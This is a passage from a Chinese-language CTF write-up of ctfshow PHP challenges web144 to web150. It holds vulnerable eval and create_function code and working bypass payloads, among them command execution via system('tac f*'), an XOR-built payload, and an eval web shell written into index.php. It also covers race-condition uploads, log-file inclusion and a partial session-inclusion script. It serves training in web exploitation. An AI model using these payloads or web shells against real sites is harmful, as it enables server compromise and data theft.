punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">1</span><span class="token operator">?</span><span class="token boolean">true</span><span class="token punctuation">:</span><span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web145——三目运算符的妙用"><a href="#web145——三目运算符的妙用" class="headerlink" title="web145——三目运算符的妙用?:"></a>web145——三目运算符的妙用?:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return 1?phpinfo():1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是可以运行出来的</p><h2 id="web146——等号和位运算"><a href="#web146——等号和位运算" class="headerlink" title="web146——等号和位运算"></a>web146——等号和位运算</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">hlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>又增加了分号的过滤，所以我们没法用三目运算符了，这时候想到了等号和位运算符</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return 1==phpinfo()||1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web147——代码注入"><a href="#web147——代码注入" class="headerlink" title="web147——代码注入"></a>web147——代码注入</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$ctfshow</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>分析正则表达式：</strong><br><code>/i</code>不区分大小写<br><code>/s</code>匹配任何不可见字符，包括空格、制表符、换页符等等，等价于<code>[\f\n\r\t\v]</code><br><code>/D</code>如果使用$限制结尾字符,则不允许结尾有换行</p><p><strong>create_function:</strong></p><p><a href="https://paper.seebug.org/755/" target="_blank" rel="noopener">参考这篇文章第一道题</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>主要用来创建匿名函数<span class="token punctuation">,</span>有时候匿名函数可以发挥它的作用。string <span class="token function">create_function</span>    <span class="token punctuation">(</span> string <span class="token variable">$args</span>   <span class="token punctuation">,</span> string <span class="token variable">$code</span>   <span class="token punctuation">)</span>string <span class="token variable">$args</span> 参数部分string <span class="token variable">$code</span> 方法代码部分举例：<span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$name'</span><span class="token punctuation">,</span><span class="token string">'echo $fname."Zhang"'</span><span class="token punctuation">)</span>类似于：<span class="token keyword">function</span> <span class="token function">fT</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token variable">$fname</span><span class="token punctuation">.</span><span class="token string">"Zhang"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>绕过匹配的方式很简单：需要在开头或者结尾找到一一个字符同时不影响函数的正常调用</p><p>现场制作一个fuzz用的字典：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"ascii.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">129</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-9]/isD'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-9]/isD'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//$c = "未编码：".$a."经过编码：".$b."\n";</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//echo $c;</span><span class="token punctuation">}</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后复制本题目代码本地搭建：开始寻找命中字符</p><p>先构造payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token variable">$hackername</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"yn8rt"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span><span class="token punctuation">}</span>所以：<span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span>'<span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"yn8rt"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//')</span>payload<span class="token punctuation">:</span><span class="token operator">?</span>show<span class="token operator">=</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"yn8rt"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span>post<span class="token punctuation">:</span>ctf<span class="token operator">=</span><span class="token operator">%</span>create_function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开始fuzz：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20210724144535.png" alt></p><p>payload：</p><p><code>?show=}system(&#39;tac f*&#39;);//</code></p><p><code>ctf=%5ccreate_function</code></p><p>而事实上%5c就是<code>\</code>：</p><p>在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法</p><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&amp;\*\+\- ]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">get_ctfshow_fl0g</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>中文变量：</p><pre><code>code=$哈=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$哈}[哼](${$哈}[嗯]);&amp;哼=system&amp;嗯=tac f*&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;; 异或出来的结果是 _GET${_GET}[哼](${_GET}[嗯]);&amp;哼=call_user_func&amp;嗯=get_ctfshow_fl0g</code></pre><p>这里是直接一个回调，利用现成的函数来读取flag.php</p><h2 id="web149——条件竞争"><a href="#web149——条件竞争" class="headerlink" title="web149——条件竞争"></a>web149——条件竞争</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//unlink() 函数删除文件。</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//file_put_contents会覆盖之前文件的内容</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>你不删除index.php，那么我就往index.php中写个木马</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>ctf<span class="token operator">=</span>index<span class="token punctuation">.</span>phpshow<span class="token operator">=</span><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'yn8rt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="方法二：-2"><a href="#方法二：-2" class="headerlink" title="方法二："></a>方法二：</h3><p>条件竞争：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>ctf<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">.</span>phpshow<span class="token operator">=</span><span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'tac /f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">CTFSHOW</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$vip</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">vip</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">secret</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isVIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">vip</span><span class="token operator">?</span><span class="token constant">TRUE</span><span class="token punctuation">:</span><span class="token constant">FALSE</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token shell-comment comment">#过滤字符</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$__CTFSHOW__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isVIP</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>非预期解：</p><p>ua头写入一句话</p><p>include包含(/var/log/nginx/access.log)</p><p>session包含脚本：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time : 20.12.5 13:52</span><span class="token comment" spellcheck="true"># @author:lonmar</span><span class="token keyword">import</span> io<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'test'</span>data <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"ctf"</span><span class="token 